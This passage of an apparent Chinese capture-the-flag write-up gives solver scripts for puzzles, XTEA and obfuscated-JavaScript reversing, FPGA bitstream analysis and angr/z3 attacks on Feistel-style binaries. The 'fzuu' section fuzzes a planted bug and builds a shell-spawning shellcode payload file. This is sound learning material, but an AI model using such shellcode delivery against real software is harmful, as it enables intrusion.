context.log_level = "DEBUG"
import re

def CONST0():
    return "x/x-x/x"

def CONST1():
    return "x/x"

def CONST10():
    return "x/x+x/x+x/x+x/x+x/x+x/x+x/x+x/x+x/x+x/x"

def CONST(n):
    if n == 0:
        return CONST0()
    assert 1 <= n <= 10
    return "+".join(CONST1() for i in range(n))


def ADD(a,b):
    return f"{a}+{b}"

def MUL(a, b):
    return f"({a})*({b})"

def MOD(a, b):
    return f"({a})%({b})"

def DIV(a,b):
    return f"({a})/({b})"

def NUM(n):
    if not n//10:
        return CONST(n%10)
    return ADD(MUL(NUM(n//10),CONST(10)),CONST(n%10))



def IF(x, a, b):
    return f"if({x},{a},{b})"

def EQ(a, b):
    return f"{a}={b}"

def AND(a, b):
    return f"{a}&&{b}"


def solve(s):
    # s is list of tuple(x,y,ans)
    # if(x0,ans0,if(x1,ans1,if(x2,ans2,if(x3,ans3,if(x4,ans4)))))
    if len(s) == 1:
        return NUM(s[0][2])
    '''
    return IF(
                AND(
                    EQ(MOD("x",CONST(10)), NUM(s[0][0]%10) ),
                    EQ(MOD("y",CONST(10)), NUM(s[0][0]%10) )
                ),
                NUM(s[0][2]),
                solve(s[1:])
            )
    '''
    return IF(
                EQ("x",NUM(s[0][0])),
                NUM(s[0][2]),
                solve(s[1:])
            )

def parse(line):
    r = re.findall(r"x=(\d+), y=(\d+), ans=(\d+)", line)[0]
    return tuple(map(int,r))

s = remote("202.38.93.111", 10800)
s.sendlineafter(b"Please input your token:", b"<>")

while True:
    s.recvuntil(b"Challenge!\n")
    values = []
    for i in range(5):
        r = s.recvline()
        values.append(parse(r.decode()))
    s.sendline(solve(values))
```


## 马赛克

对原图未知的块的颜色设未知数，按照马赛克的算法列方程（为了确保运算在整数范围内，不计算平均值的除法，而是把最终颜色乘上点的数量）。  
未知的颜色只有0或255两种取值，大概又是一类整数线性方程求解的问题。  
DFS、BFS之类的算法应该很有效，但是算法太复杂不想写。直接丢给z3求解，几分钟的速度还能接受。  

```python
from PIL import Image
from z3 import *

im = Image.open("pixelated_qrcode.bmp")
im = im.convert("RGB")

a = [[None]*57 for _ in range(57)]
b = [[None]*20 for _ in range(20)]

assert 57*11 == 627

for x in range(627):
    for y in range(627):
        i = x // 11
        j = y // 11
        rgb = im.getpixel((y,x))
        assert rgb[0]==rgb[1]==rgb[2]
        if rgb[0] in [0,255]:
            if a[i][j] is None:
                a[i][j] = rgb[0]
            assert a[i][j] == rgb[0]
            
        if 103 <= x < 103+20*23 and 137 <= y < 137+20*23:
            i = (x-103)//23
            j = (y-137)//23
            if b[i][j] is None:
                b[i][j] = rgb[0]
            assert b[i][j] == rgb[0]
    
print(a)
print(b)

s = Solver()

values = {}

for i in range(57):
    for j in range(57):
        if a[i][j] is None:
            tmp = Int(f"a_{i}_{j}")
            values[(i,j)] = tmp
            a[i][j] = tmp
            s.add(Or(tmp==0,tmp==255))

for i in range(20):
    for j in range(20):
        t = 0
        for ki in range(23):
            for ky in range(23):
                t += a[(103+i*23+ki)//11][(137+j*23+ky)//11]
        s.add(t >= b[i][j]*23*23)
        s.add(t < (b[i][j]+1)*23*23)
        

print(s.check())
m = s.model()
print(m)

for k,v in values.items():
    #print(m[v].as_long())
    a[k[0]][k[1]] = m[v].as_long()


newim = Image.new("RGB", (627,627))
for x in range(627):
    for y in range(627):
        i = x // 11
        j = y // 11
        rgb = (a[i][j],a[i][j],a[i][j])
        newim.putpixel((y,x),rgb)
newim.save("flag.png")
```

## minecRaft
（这哪里是web题了，这明明是reverse题）

浏览器打开F12，熟悉的反调试和变量名，应该是sojson的混淆。  
（正好之前写一个爬虫时搞过一点这个js混淆）  

检查逻辑在flag.js里。清掉定时器 `for(i=1;i<=10000;i++){clearInterval(i);}` 就能调试了。_0x22517d带整数返回的就是字符串字面量，在console里跑一下即可。  
code函数是XTEA加密，未经任何修改，提取密钥和加密后的比较数据，解密即可。  

```python
def p32(n):
    n &= 0xffffffff
    return n.to_bytes(4, 'little')

def u32(s):
    assert len(s) == 4
    return int.from_bytes(s, 'little')

from ctypes import *

def xtea_encrypt(v, k):
    v0 = c_uint32(v[0])
    v1 = c_uint32(v[1])
    delta = 0x9E3779B9
    s = c_uint32(0)
    
    n = 32
    w = [0,0]

    while(n>0):
        v0.value += (((v1.value << 4) ^ (v1.value >> 5)) + v1.value) ^ (s.value + k[s.value & 3])
        s.value += delta
        v1.value += (((v0.value << 4) ^ (v0.value >> 5)) + v0.value) ^ (s.value + k[(s.value>>11) & 3])
        #print(sum.value, y.value, z.value)
        n -= 1

    w[0] = v0.value
    w[1] = v1.value
    return w

def xtea_decrypt(v, k):
    v0 = c_uint32(v[0])
    v1 = c_uint32(v[1])
    delta = 0x9E3779B9
    s = c_int32((delta * 32) & 0xffffffff)
    n = 32
    w = [0,0]

    while(n>0):
        v1.value -= (((v0.value << 4) ^ (v0.value >> 5)) + v0.value) ^ (s.value + k[(s.value>>11) & 3])
        s.value -= delta
        v0.value -= (((v1.value << 4) ^ (v1.value >> 5)) + v1.value) ^ (s.value + k[s.value & 3])
        n -= 1

    w[0] = v0.value
    w[1] = v1.value
    return w


k = (u32(b'1356'), u32(b'8531'), u32(b'4905'), u32(b'4377'))    # '1356853149054377'
finalv = ('6fbde674', '819a59bf', 'a1209256', '5b4ca2a7', 'a11dc670', 'c678681d', 'af4afb67', '04b82f0c') # '6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c'
finalv = [int(s, 16) for s in finalv]

print(k)
print(finalv)
print(xtea_encrypt((u32(b'0123'), u32(b'4567')), k))

flag = b""
for i in range(0, 8, 2):
     r0, r1 = xtea_decrypt((finalv[i], finalv[i+1]), k)
     print(p32(r0), p32(r1))
     flag += p32(r0)+p32(r1) 

print(flag)
```


## 密码生成器

upx -d 脱壳，IDA打开发现是静态链接的qt程序，太复杂了实在是找不到关键点在哪里。  
题目处处暗示了随机数生成与时间相关，代码里找time64函数的交叉引用，定位到 sub_BC9320 函数，动态调试确认这就是随机密码生成的地方。  
试图把算法提取出来发现还是做不到，但至少能通过在调试器里改time64函数的返回值生成任意时间戳下的密码了。  

网页提示的注册时间是 "北京时间  2021-09-22 23:11"（时间戳 1632323480），在这前后一个一个手试。
```
1632323490 RRJO~HU7HBCMABPe
1632323489 1Er1XnkL!NPBjwcM
1632323488 eC-FNPUNYFAEA1mc
1632323487 J}LPD6rFD!HqABKa
1632323486 g8JEyCPpP3hV!tJH
1632323485 7eB)CFngcGRBGFdS
1632323484 ^QBHI1ADoJOISGCj
1632323483 QrzR2UEOIiQZA&NZ
1632323482 JMEvcAL1Ap(vSHLJ
1632323481 ~F-SOQP3BZIamb5V

1632323480 HHAFET!LLLE4sAAq
1632323479 giP2I*bfNV_pFQ)O
1632323478 1SIpEeFFE`MC)BJL
1632323477 HI2GhFSJCSX7ALv~
1632323476 N^RaeLCmMPAGR9E>
1632323475 U~WO4jEpGBlMS{TC
1632323474 CLbCOFLM1keT_KKz
1632323473 $#OKnP(L5RcUtI+Y
1632323472 @(h65JEXpG0N{Gpg
1632323471 IdDjCOTAVa0/2GAI

1632323470 P7DD1GBBKn*zsQKC
1632323469 JrICDVG0ACS@Ptbv
1632323468 EFXH"hLFohDA>6!B
1632323467 Bl+P8XqyLmeOR~H+
1632323466 {BYRBYX%A4IkANtn
1632323465 iowOKEe@Db0Lb_mV
1632323464 cCC^Q9LtUSBqgGUA
1632323463 HH2_JHH$CLVGacDC 
1632323462 YtbZQA{_BF2aJ}NE
1632323461 /sD8qMrmII7Ex$Hk


1632323460 g7ELNM%IgOs9ESWx    // *
1632323459 Q9wUh-GLfBCaBJ3N
1632323458 AaCFFT{Ak1oWxF&M
1632323457 BuAdI%J1XJRLozMd
1632323456 KUjIBpEBGCIhN#2f
1632323455 ~MBXa9VLudcLB>hD
1632323454 $Z=CBDL7TjHu~mEX    // correct
```

向后试了很多，结果正确的密码是在向前的时间生成的。


## 外星人的音游掌机

找到了ICE40板子的逆向工具 [IceStorm](https://github.com/YosysHQ/icestorm )，把bitstream转换为verilog代码。  
对于 wire 的 assign 操作是可以内联化简的，写了个小程序把它们转换成C语言的宏：
```
with open("bitstream_stripped.v", "r") as f:
    lines = f.readlines()

c_global_vars = []
c_wires = []

c_macro_exprs = []
c_assign_exprs = []
c_on_posedges = []

for line in lines:
    line = line.strip()
    if not line:
        continue
    if "/*" in line:
        t1 = line.index("/*")
        t2 = line.index("*/ ", t1)+3
        line = line[:t1]+line[t2:]
    line = line.replace("1'b0", "0")
    line = line.replace("1'b1", "1")
    line = line.replace("<=", "=")

    if line.startswith("module"):
        c_global_vars.extend(["clk", "btn1", "tx", "led", "btn2", "btn3", "btn4"])
    elif line.startswith("wire"):
        tokens = line.replace(",", "").replace(";", "").split()[1:]
        for t in tokens:
            if t not in c_global_vars and t not in c_wires:
                c_wires.append(t)
    elif line.startswith("reg"):
        tokens = line.replace(",", "").replace(";", "").split()[1:]
        for t in tokens:
            if t.startswith("n") and t not in c_global_vars and t not in c_wires:
                c_global_vars.append(t)
    elif line.startswith("assign"):
        assert line.endswith(";")
        var = line.split()[1]
        expr = line[line.index(" = ")+3:-1]
        if var in c_global_vars:
            c_assign_exprs.append(f'{var} = {expr}')
        elif var in c_wires:
            c_macro_exprs.append(f'#define {var} ({expr})')
        else:
            assert 0, var
    elif line.startswith("always @(posedge clk) "):
        assert line.endswith(";")
        expr = line[len("always @(posedge clk) "):-1]
        c_on_posedges.append(expr)
    elif line.startswith("endmodule"):
        pass
    else:
        assert 0, line

with open("bitstream_converted.c", "w") as f:
    f.write("""#include <stdio.h>
#include <stdbool.h>

""")
    for expr in c_macro_exprs:
        f.write(expr+"\n")

    for var in c_global_vars:
        f.write(f"bool {var};\n")

    f.write("\n")
    for i, expr in enumerate(c_on_posedges):
        f.write(f"""__attribute__((__used__))
void on_posedge_{i}(void) {{
    {expr};
}}

""")
    
    f.write("""
int main(void) {
""")

    for expr in c_assign_exprs:
        f.write(f"    {expr};\n")

    f.write("""
    return 0;
}
""")
```
然后编译（-g -O0）再IDA反编译看，没有了wire变量的干扰，触发led亮的逻辑就非常清晰了。  

与led有关的函数：
```c

void __cdecl on_posedge_20()
{
  bool v0; // al

  if ( btn1 )
  {
    v0 = n222;
    if ( n221 && n219 && n220 )
      v0 = !n222;
    n222 = v0;
  }
}

void __cdecl on_posedge_58()
{
  bool v0; // al

  if ( btn1 )
  {
    v0 = n221;
    if ( n219 && n220 )
      v0 = !n221;
    n221 = v0;
  }
}

void __cdecl on_posedge_30()
{
  bool v0; // al

  if ( btn1 )
  {
    v0 = n219;
    if ( n220 )
      v0 = !n219;
    n219 = v0;
  }
}

void __cdecl on_posedge_64()
{
  if ( btn1 )
    n220 ^= 1u;
}

void __cdecl on_posedge_48()
{
  n223 = btn2;
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  bool v3; // al

  if ( n222 && n221 && n220 && !n219 )
  {
    if ( btn3 && !btn4 )
    {
      if ( n223 )
        v3 = !btn2;
      else
        v3 = btn2;
    }
    else
    {
      v3 = 0;
    }
  }
  else
  {
    v3 = 0;
  }
  led = v3;
  tx = !n32;
  return 0;
}
```

\[n222, n221,n219,n220\] 是一个4位累加器，记录btn1按下的次数；led亮需要btn1按下13次，btn3长按，btn4未按，btn2每个上升沿过后值要反转。  
看题解用的都是Icarus仿真器。我用了verilator，无论怎么调，时钟上升沿之后的1ns期间led总是灭的（尽管其他时刻能亮），串口也没有输出。  


## JUST BE FUN
用一个三维pc基于栈的语言写一个寄存器。没有全局变量和寄存器只有栈写起来可能会有困难，而且预期写出来工作量应该很大，不想写。  


## fzuu
初试afl  

内核选项 `echo core /proc/sys/kernel/core_pattern` 必须要调，之前忽略了这个问题导致始终没有跑出结果。  

初始输入用例直接用题目给的`fuzz_in`即可，无需添加其他用例。  
```shell
afl-fuzz -i fuzz_in -o fuzz_out/ ./objdump_afl -d @@
```
十几分钟后找到了第一个crash用例：
```
00000000: 5331 3031 7551 675b 6b5f 1804            S101uQg[k_..
```

bug在0xf9626，对照源码，是解析 S-record file时，原本的min_bytes是3，但这里强行指定为了1。  
srec_scan_helper也是人为添加的函数，读入一段shellcode然后执行（checksec检查了一下发现没开NX）。  


```python
from pwn import *
import base64

context.arch = "amd64"

shellcode = asm(shellcraft.sh())

fileheader = b"S100??"

assert b"\xff" not in shellcode

print(base64.b64encode(fileheader+shellcode+bytes([0xff])))
```


## p😭q

查文档，调用api把每个步骤都反过来做一遍即可。  

(没有注意到librosa.feature.inverse.mel_to_audio接口，参考 [https://stackoverflow.com/questions/56931834/creating-wave-data-from-fft-data/57323359#57323359](https://stackoverflow.com/questions/56931834/creating-wave-data-from-fft-data/57323359#57323359 )用了mel_to_stft和griffinlim两个分步接口)  

```
from PIL import Image, ImageSequence
import numpy
import librosa
import soundfile

im = Image.open("flag.gif")
it = ImageSequence.Iterator(im)

frames = []
for imgframe in it:
    imgframe = imgframe.convert("RGB")
    frame = []
    for x in range(3, 129, 4):
        y = 91
        while True:
            rgb = imgframe.getpixel((x,y))
            #print(rgb)
            if rgb == (255,0,0):
                y -= 1
            else:
                break
        frame.append(30-y+1)
    #print(frame)
    frames.append(frame)

frames = numpy.array(frames)
spectrogram = frames.transpose()

mel_spec = librosa.db_to_power(spectrogram)


S_inv = librosa.feature.inverse.mel_to_stft(mel_spec, sr=22050, n_fft=2048)
y_inv = librosa.griffinlim(S_inv, n_iter=32, hop_length=512)

soundfile.write('inv.wav', y_inv, samplerate=22050)
```

之后是英语听力，反复听了很多遍才辨认出大数字的英文读法。  


## Make a wish
没看


## 超 OI 的 Writeup 模拟器

（看了另外两人的题解，才知道原来输出的低位只与输入的低位有关，是可以逐位爆破的……）

### 果然还是逆向比较简单
0.bin还是要手逆的  
```
unsigned __int64 __fastcall sub_1160(__int64 a1, __int64 a2, unsigned __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rdi
  __int64 i; // [rsp+8h] [rbp-40h]

  for ( i = a2 ^ a1; ; i -= 0x20750C1F7E22FC87LL )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( i > 0x4608879D20993EDBLL )
        {
          if ( i > 0x69F330635DD21BC6LL )
          {
            if ( i == 0x69F330635DD21BC7LL )
            {
              i = 0x21F6E214B0187F72LL;
              a4 ^= a3;
            }
            else
            {
              if ( i != 0x6EAE81CD1556CB1ALL )
                goto LABEL_2;
              i = 0x21F6E214B0187F72LL;
              a4 *= a4 ^ a3;
            }
          }
          else if ( i == 0x4608879D20993EDCLL )
          {
            i = 0x21F6E214B0187F72LL;
            a4 &= a4 ^ a3;
          }
          else
          {
            if ( i != 0x54D84F78B9ACB5A3LL )
              goto LABEL_2;
            i = 0x21F6E214B0187F72LL;
            a4 |= a4 ^ a3;
          }
        }
        if ( i > 0x21F6E214B0187F71LL )
          break;
        if ( i == 0x95C64E934D54CD6CLL )
        {
          i = 0x21F6E214B0187F72LL;
          a4 = (a3 & 0x5D0753764802B909LL ^ 0x4907405648003001LL | (0x5D0753764802B909LL * a3) ^ 0x485B974538C1747BLL | a4 & 0xA318E5ACC4A3ACCDLL ^ 0x308012840032845LL | (0xA318E5ACC4A3ACCDLL * a4) ^ 0x387BC2860C2CEABLL) != 0;
        }
        else
        {
          if ( i != 0xAE6475F8F6E6E88ALL )
            goto LABEL_2;
          i = 0x21F6E214B0187F72LL;
          a4 += a3;
        }
      }
      if ( i != 0x3C5E6316F4D2B25ALL )
        break;
      i = 0x21F6E214B0187F72LL;
      a4 = a3;
    }
    if ( i == 0x21F6E214B0187F72LL )
      break;
LABEL_2:
    v4 = a3 ^ ((a4 ^ 0x2A500606480A22LL) & 0x836A518756E88F32LL | 1);
    a3 = a4;
    a4 = v4;
  }
  return a4;
}
```

控制流只与a1,a2有关，与a3,a4无关。题目中a1,a2总是常量，所以控制流其实是完全确定的。  
动态调试，发现只有LABEL_2下面的三行代码是每轮都会执行的；执行15轮后进入i == 0x95C64E934D54CD6CLL的基本块，然后返回。  

15轮主循环是Feistel密码结构，最后一个基本块用z3求逆，然后反向迭代Feistel

```python
from z3 import *

def p64(n):
    n &= (1<<64)-1
    return n.to_bytes(8, 'little')

a3 = BitVec("a3", 64)
a4 = BitVec("a4", 64)


s = Solver()
s.add((a3 & 0x5D0753764802B909) ^ 0x4907405648003001 == 0)
s.add((0x5D0753764802B909 * a3) ^ 0x485B974538C1747B == 0)
s.check()
a3 = s.model()[a3].as_long()

s = Solver()
s.add((a4 & 0xA318E5ACC4A3ACCD) ^ 0x308012840032845 == 0)
s.add((0xA318E5ACC4A3ACCD * a4) ^ 0x387BC2860C2CEAB == 0)
s.check()
a4 = s.model()[a4].as_long()

for i in range(15):
    a3, a4 = a4 ^ ((a3 ^ 0x2A500606480A22) & 0x836A518756E88F32 | 1) , a3

print(hex(a3), hex(a4))

flag = p64(a3)+p64(a4)

print(flag)
```


### 这次没人两小时手做吧

遍历题目接口，发现共256个二进制文件（0.bin -> 255.bin），全部搞下来：
```shell
for i in $(seq 0 256)
do
curl "http://202.38.93.111:13768/challenge/${i}.bin" \
  -O \
  -H 'Cookie: <>' \
  --compressed \
  --insecure
done
```

1.bin - 15.bin 还是在 angr 的求解能力内的。搜索网上的中文文章，绝大多数都是抄来抄去的那个以stdin作为符号输入、以stdout作为约束的例子……只好去读官方文档看符号变量怎么定义。  
以1.bin为例，
```
__int64 __fastcall sub_15C0(__int64 a1, __int64 a2)
{
  return sub_1160(0x3C1AE68A57BEDAE5LL, 0x574402173F80BF95LL, a1, a2);
}
```
符号执行的范围仅限于此就可以了，把a1和a2设为符号变量，求解约束是返回值（rax）等于0。  

如何找到sub_15C0函数的位置：比较粗暴，直接搜索call sub_1160前的字节码，然后加上sub_15C0函数的大小（是固定值）。  

```python
import sys
import angr
import claripy
import logging

def p64(n):
    n &= (1<<64)-1
    return n.to_bytes(8, "little")

logging.getLogger('angr').setLevel("CRITICAL")

filename = sys.argv[1]
print(filename)
with open(filename, "rb") as f:
    allcontent = f.read()

startaddr = allcontent.index(bytes.fromhex("50 48 89 F1 48 89 FA 48  BF".replace(" ", "")))
startaddr += 0x400000
endaddr = startaddr + 0x21
print(hex(startaddr), hex(endaddr))

proj = angr.Project(filename)
state = proj.factory.blank_state(addr=startaddr)
v0 = state.solver.BVS('v0', 64)
v1 = state.solver.BVS('v1', 64)
state.regs.rdi = v0
state.regs.rsi = v1
simgr = proj.factory.simulation_manager(state)
simgr.explore(find=endaddr)
found = simgr.found[0]
found.add_constraints(found.regs.rax == 0)
r0 = found.solver.eval(v0)
r1 = found.solver.eval(v1)

print(r0, r1)
flag = p64(r0)+p64(r1)

print(flag.decode())
print()
```

大约2-3分钟能解出一题。  

### 什么叫无情的逆向机器

（看了出题人的题解感觉我的解法也是非预期）  

从16.bin开始，上面的程序就解不动了（挂机一整个晚上）。  

注意到 sub_1160 内部有很多纯计算的小基本块，根据0.bin的控制流，合理猜测这些基本块仅在递归调用中才会经过，且所有的递归调用应该都是这种简单的计算。  
主循环仍然是类似Feistel的结构。  

z3解多轮Feistel是解不动的，但是解单轮Feistel是非常轻松的。鉴于此，猜测如果把每轮的轮变量都单独创建为符号变量，然后约束仅添加到相邻两轮的符号变量中，不扩散到其他轮，应该就能成功求解。  

以经典的TEA加密作为例子验证这个猜测：  
```python
from z3 import *

def tea_encrypt(v, k):
    v0, v1 = v
    k0, k1, k2, k3 = k
    s = 0
    delta = 0x9e3779b9
    for i in range(32):
        s += delta
        s &= 0xffffffff
        v0 += ((v1 << 4) + k0) ^ (v1 + s) ^ ((v1 >> 5) + k1)
        v0 &= 0xffffffff
        v1 += ((v0 << 4) + k2) ^ (v0 + s) ^ ((v0 >> 5) + k3)
        v1 &= 0xffffffff
    return v0, v1


def tea_encrypt_z3(v, k):
    global ss
    v0, v1 = v
    k0, k1, k2, k3 = k
    s = 0
    delta = 0x9e3779b9
    for i in range(32):
        s += delta
        s &= 0xffffffff
        v0 += ( ((v1 << 4) + k0) ^ (v1 + s) ^ (LShR(v1, 5) + k1) )
        v0 &= 0xffffffff
        new_v0 = BitVec(f"tmp_{i}_v0", 32)
        ss.add(new_v0 == v0)
        v0 = new_v0
        v1 += ( ((v0 << 4) + k2) ^ (v0 + s) ^ (LShR(v0, 5) + k3) )
        v1 &= 0xffffffff
        new_v1 = BitVec(f"tmp_{i}_v1", 32)
        ss.add(new_v1 == v1)
        v1 = new_v1
    return v0, v1


v = [0x12345678, 0x9abcdef0]
k = [0x11111111, 0x22222222, 0x33333333, 0x44444444]

v0 = BitVec("v0", 32)
v1 = BitVec("v1", 32)

ss = Solver()
answer = tea_encrypt(v, k)
print(v, answer)

r0, r1 = tea_encrypt_z3([v0, v1], k)    # this is easy to be solved
# r0, r1 = tea_encrypt([v0, v1], k)    # this cannot be solved
ss.add(r0 == answer[0])
ss.add(r1 == answer[1])

print(ss.check())
print(ss.model())
```

发现确实可行，原本z3是无法求解32轮的TEA加密的，但是经此处理后瞬间可出答案。  


根据这个思想修改上一关的angr代码，关键点是找到Feistel轮变量赋值的位置。以255.bin为例，即下图中 `a3 = a4` 和 `a4 = v39` 两条指令的位置：  
```c
__int64 __fastcall sub_1160(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
    ...
LABEL_20:
    v26 = sub_1160(0x2C26BFF355716FE1LL, 0x4B13A095C11D2AFFLL, a4 + (a4 ^ 0x8C28FA7017742698LL), a4);
    v27 = sub_1160(0xA328DADAB4E1A1AFLL, 0x2AEEE0B23C833E92LL, v26, a4);
    v28 = sub_1160(0xEE8B2858DCEDE8BLL, 0x5A53BA0B3FE7BDB0LL, 0x744F213BC10F0FF3LL, v27);
    v29 = sub_1160(0x56A77408888A4CA1LL, 0x6D33F9CF21DB070ELL, v28 + v27, v27);
    v30 = sub_1160(0x683931D0BEFC9C51LL, 0xD2A4C84615C4546FLL, (v27 ^ v29) + v27, v27);
    v31 = sub_1160(0x8244D5725F3ACA47LL, 0xD2ECBC7C99F0AFC3LL, v30, v27);
    v32 = sub_1160(0xA66A26548DB46F55LL, 0xF9C5114BAE888450LL, 1LL, v31);
    v33 = sub_1160(0xE7D4EBEC2D077A9FLL, 0x79F7CA08B42CE372LL, v32 + v31, v31);
    v34 = sub_1160(0xB0022EF8CC267077LL, 0xF6642B02A718FC99LL, (v31 ^ v33) + v31, v31);
    v35 = sub_1160(0x7CFD6DCAB2B3060FLL, 0xF733B44E980C5C80LL, v34, v31);
    v36 = sub_1160(0x2C6A3644D365B895LL, 0x6DB46231C4193050LL, a3, v35);
    v37 = sub_1160(0x51E2D05DE772867LL, 0x69F934D298C02102LL, v36 + v35, v35);
    v38 = sub_1160(0x9CD919637A6710B3LL, 0x6AD7813A668969E5LL, (v35 ^ v37) + v35, v35);
    v39 = sub_1160(0x8042619DA648076FLL, 0xFE983D12A7C241BBLL, v38, v35);
    a3 = a4;
    v42 = sub_1160(0xF0CAE7A2FA83562DLL, 0x9F8138B7FE3942D0LL, v42, 0x97B611B8E17A05F5LL);
    a4 = v39;
	...
```
有点困难，除非进行较为深入的程序分析（不会）。  
仍然采用简单粗暴的方法：hook所有的内存写入，只要待写入的值是符号变量，就创建一个新的符号变量、同时添加一条新老变量相等的约束。  
（这段代码写出来虽然非常短，但是花费时间很长，主要是参考资料很难找……angr的文档并没有包含所有的细节，必要时还得看源码）  

```python
import sys
import angr
import claripy
import logging
import code

def p64(n):
    n &= (1<<64)-1
    return n.to_bytes(8, "little")

#logging.getLogger('angr').setLevel("CRITICAL")


global_hook_count = 0
def mem_write_hook(state):
    global global_hook_count
    if (state.inspect.mem_write_expr.symbolic):
        # and state.inspect.mem_write_expr.op != 'BVS'):
        global_hook_count += 1
        old = state.inspect.mem_write_expr
        new = claripy.BVS(f"tmp_mem_write_hook_{global_hook_count}", old.length)
        state.add_constraints(new == old)
        state.inspect.mem_write_expr = new

filename = sys.argv[1]
print(filename)
with open(filename, "rb") as f:
    allcontent = f.read()

startaddr = allcontent.index(bytes.fromhex("50 48 89 F1 48 89 FA 48  BF".replace(" ", "")))
startaddr += 0x400000
endaddr = startaddr + 0x21
print(hex(startaddr), hex(endaddr))

proj = angr.Project(filename)
state = proj.factory.blank_state(addr=startaddr)
v0 = state.solver.BVS('v0', 64)
v1 = state.solver.BVS('v1', 64)
state.regs.rdi = v0
state.regs.rsi = v1
state.inspect.b("mem_write", when=angr.BP_BEFORE, action=mem_write_hook)
simgr = proj.factory.simulation_manager(state)
simgr.explore(find=endaddr)
found = simgr.found[0]
found.add_constraints(found.regs.rax == 0)
r0 = found.solver.eval(v0)
r1 = found.solver.eval(v1)

print(r0, r1)
flag = p64(r0)+p64(r1)

print(flag.decode())
print()
```

大约7-8分钟（最慢不超过10分钟）能解出一道题，开16个进程同时跑，2小时后回来看结果，发现还剩十几道题没解出来，原因是求解器返回了unsat；对解出来的结果做验证，有几道题的答案是错误的（十分不解，按道理前述替换应当是保守的，不应unsat或解出错误答案）  


针对这些题，手动逆向找到Feistel轮变量赋值的准确地址，然后只在这两个地址处进行上述变换：  
```python
import sys
import angr
import claripy
import logging
import code

def p64(n):
    n &= (1<<64)-1
    return n.to_bytes(8, "little")

logging.getLogger('angr').setLevel("CRITICAL")

#global_context = ("./bins/28.bin", (0x4013f6, 0x401480))
#global_context = ("./bins/36.bin", (0x401389, 0x401406))
#global_context = ("./bins/47.bin", (0x4019e3, 0x401a4c))
#global_context = ("./bins/83.bin", (0x40138d, 0x401430))
#global_context = ("./bins/131.bin", (0x4013e0, 0x401461))
#global_context = ("./bins/145.bin", (0x4013ab, 0x401428))
#global_context = ("./bins/166.bin", (0x4013f5, 0x401498))
global_context = ("./bins/189.bin", (0x4013d8, 0x401441))
#global_context = ("./bins/49.bin", (0x4013ca, 0x401433))
#global_context = ("./bins/106.bin", (0x4019c2, 0x401a09))
#global_context = ("./bins/146.bin", (0x4013b1, 0x401410))
#global_context = ("./bins/194.bin", (0x4013f5, 0x40145a))


global_hook_count = 0
def mem_write_hook(state):
    global global_context
    global global_hook_count
    if (state.inspect.mem_write_expr.symbolic):
        pc = state.regs.rip.args[0]
        assert type(pc) is int
        hook_pclist = global_context[1]
        if not (pc in hook_pclist):
            return
        #print(hex(pc))
        global_hook_count += 1
        old = state.inspect.mem_write_expr
        new = claripy.BVS(f"tmp_mem_write_hook_{global_hook_count}", old.length)
        state.add_constraints(new == old)
        state.inspect.mem_write_expr = new

filename = global_context[0]
print(filename)
with open(filename, "rb") as f:
    allcontent = f.read()

startaddr = allcontent.index(bytes.fromhex("50 48 89 F1 48 89 FA 48  BF".replace(" ", "")))
startaddr += 0x400000
endaddr = startaddr + 0x21
print(hex(startaddr), hex(endaddr))

proj = angr.Project(filename)
state = proj.factory.blank_state(addr=startaddr)
v0 = state.solver.BVS('v0', 64)
v1 = state.solver.BVS('v1', 64)
state.regs.rdi = v0
state.regs.rsi = v1
state.inspect.b("mem_write", when=angr.BP_BEFORE, action=mem_write_hook)
simgr = proj.factory.simulation_manager(state)
simgr.explore(find=endaddr)
found = simgr.found[0]
found.add_constraints(found.regs.rax == 0)
r0 = found.solver.eval(v0)
r1 = found.solver.eval(v1)

print(r0, r1)
flag = p64(r0)+p64(r1)

print(flag.decode())
print()
```

单题求解速度快了一些，基本上所有题都出来了，只剩下 189.bin 这一个大魔王还是解不动（unsat）……


无奈，尝试手动逆向（有点复杂，逆不动）  
这是189.bin的sub_1160函数的轮函数部分：  
```
LABEL_2:
    v4 = sub_1160(0xC6F36E4BA40593B7LL, 0x79BD5BAC3129AB89LL, 0x8F1D2D097B46444LL, a4);
    v5 = sub_1160(0x43D8E4C931F0F2BBLL, 0xF1F1174B00EF805BLL, v4, a4);
    v6 = sub_1160(0x7F5465454593E123LL, 0xB54D226C820D5878LL, v5 - a4, a4);
    v7 = sub_1160(0xC08474758D13882BLL, 0x441F39578FD9F52CLL, v6, a4);
    v8 = sub_1160(0x51C5319D3885AC3BLL, 0xEEEB985A9CA99305LL, 0x535ADC97148E9459LL, v7);
    v9 = sub_1160(0x15A88B6F63DEB4F9LL, 0x202170A4CF01BE1DLL, v8, v7);
    v10 = sub_1160(0xCD438FF4A252BEADLL, 0x675DF7BD254E7AEELL, v9 - v7, v7);
    v11 = sub_1160(0x4515707A3C3DDD11LL, 0xE7FA089A87C8718FLL, v10, v7);
    v12 = sub_1160(0x4DC6B84B1A3D9FBDLL, 0xF2EA11ACBAF19F83LL, 1LL, v11);
    v13 = sub_1160(0xA95AFFBBB87FA421LL, 0x8C6EFC587A60CEF5LL, v12, v11);
    v14 = sub_1160(0x87B286896B926DDDLL, 0xACEF01285C0ECBBELL, v13 - v11, v11);
    v15 = sub_1160(0x16A9B838F8D287ADLL, 0xA2B86C1CE8E97978LL, v14, v11);
    v16 = sub_1160(0x410069451E53E065LL, 0xFFB060B2B6DB5EDBLL, a3, v15);
    v17 = sub_1160(0x929E7CA7AEF1AAA3LL, 0xA32B7F6C83EEC873LL, v16, v15);
    v18 = sub_1160(0xF127956C6CD50545LL, 0x4379F2455ACC3456LL, v17 - v15, v15);
    v19 = sub_1160(0x55C104881C618A41LL, 0xD74E748CA7A4C45FLL, v18, v15);
    a3 = a4;    // 0x13d8
    v20 = sub_1160(0x64AD977B00FCD255LL, 0xCFF3F036C6A46746LL, v48 + 0x12A5A90E5848DDBBLL, 0xED5A56F1A7B72245LL);
    v48 = sub_1160(0x1AD5CBF15DDEA19BLL, 0x19CBBBC069C29800LL, v20, 0xED5A56F1A7B72245LL);
    a4 = v19;    // 0x1441
```
对应的汇编：
```asm
.text:00000000000013D0                 call    sub_1160
.text:00000000000013D5                 mov     rbx, rax
.text:00000000000013D8                 mov     [rsp+48h+var_38], r12
.text:00000000000013DD                 mov     rbp, 0ED5A56F1A7B72245h
